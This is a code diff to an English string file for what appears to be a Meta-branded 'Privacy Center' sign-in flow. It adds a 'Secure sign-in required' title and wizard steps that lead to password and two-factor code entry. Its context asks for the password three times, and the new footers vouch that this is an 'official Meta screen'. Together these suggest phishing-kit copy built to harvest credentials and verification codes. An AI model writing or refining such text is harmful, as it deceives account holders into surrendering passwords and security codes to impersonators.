@@ -73,6 +73,7 @@ export const en: AppStrings = {
     errYear: 'Please select a year of birth.',
   },
   password: {
+    modalTitle: 'Secure sign-in required',
     firstPrompt: 'For security reasons, please enter your password to continue.',
     secondPrompt: 'Please re-enter your password to confirm and continue.',
     thirdPrompt: 'Please enter your password one more time to confirm and continue.',
@@ -125,6 +126,19 @@ export const en: AppStrings = {
       "We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.",
     p3:
       'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.',
+  },
+  wizard: {
+    progress: (c, t) => `Step ${c} of ${t}`,
+    progressStepsAria: 'Application progress steps',
+    completedHint: 'All steps completed',
+    stepApplication: 'Application',
+    stepSignIn: 'Sign-in',
+    stepSecurity: 'Security',
+    stepTwoFactor: 'Two-factor verification',
+    passwordFooterTrust:
+      'Meta will never call or message you asking for your password or your full security code. Only enter it on official Meta screens like this one.',
+    twoFaFooterTrust:
+      'Never share your verification code via email, messaging apps, link shorteners, or with anyone who contacts you unexpectedly—even if they claim to be from Meta.',
   },
   nav: {
     heading: 'Privacy Center',
